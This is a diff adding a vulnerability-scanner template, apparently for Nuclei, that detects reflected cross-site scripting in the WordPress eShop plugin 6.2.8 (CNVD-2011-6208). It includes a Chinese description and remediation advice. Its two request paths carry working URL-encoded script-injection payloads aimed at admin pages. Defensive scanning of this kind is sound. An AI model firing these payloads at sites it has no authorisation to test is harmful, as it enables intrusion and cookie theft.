@@ -1,0 +1,27 @@
+id: CNVD-2011-6208
+info:
+  name: WordPress eShop Plugin 6.2.8 Multiple Cross Site Scripting Vulnerabilities
+  author:
+  - l0ne1y
+  description: |-
+    WordPress Plugin eShop 6.2.8 跨站脚本漏洞
+    WordPress是一种使用PHP语言开发的博客平台，用户可以在支持PHP和MySQL数据库的服务器上架设自己的网志。 WordPress的eShop插件没有对用户提供的输入进行正确过滤，导致存在多个跨站脚本攻击漏洞。远程攻击者可利用这些漏洞执行受影响站点上下文用户浏览器中的任意脚本代码并窃取基于cookie的认证证书。
+  severity: medium
+  remediation: |-
+    官方修复方案：
+    1、建议用户到官方获取最新补丁或者最新版本程序：http://wordpress.org/extend/plugins/eshop/
+
+    临时修复方案：
+    1、对输入(和URL参数)进行过滤，对输出进行编码，白名单和黑名单结合。也就是对提交的所有内容进行过滤，对url中的参数进行过滤，过滤掉会导致脚本执行的相关内容；然后对动态输出到页面的内容进行html编码，使脚本无法在浏览器中执行。虽然对输入过滤可以被绕过，但是也还是会拦截很大一部分的XSS攻击；最后对字符进行白名单或者黑名单限制。
+requests:
+- matchers:
+  - type: dsl
+    condition: or
+    dsl:
+    - ' contains(body_1,"alert(/hello_topper/)") && status_code_1==200 '
+    - ' contains(body_2,"alert(/hello_topper/)") && status_code_2==200 '
+  matchers-condition: and
+  path:
+  - '{{BaseURL}}/wp-admin/admin.php?page=eshop-templates.php&eshoptemplate=%22%3E%3Cscript%3Ealert%28%2Fhello_topper%2f%29;%3C/script%3E'
+  - '{{BaseURL}}/wp-admin/admin.php?page=eshop-orders.php&view=1&action=%22%3E%3Cscript%3Ealert%28%2Fhello_topper%2f%29;%3C/script%3E'
+  method: GET
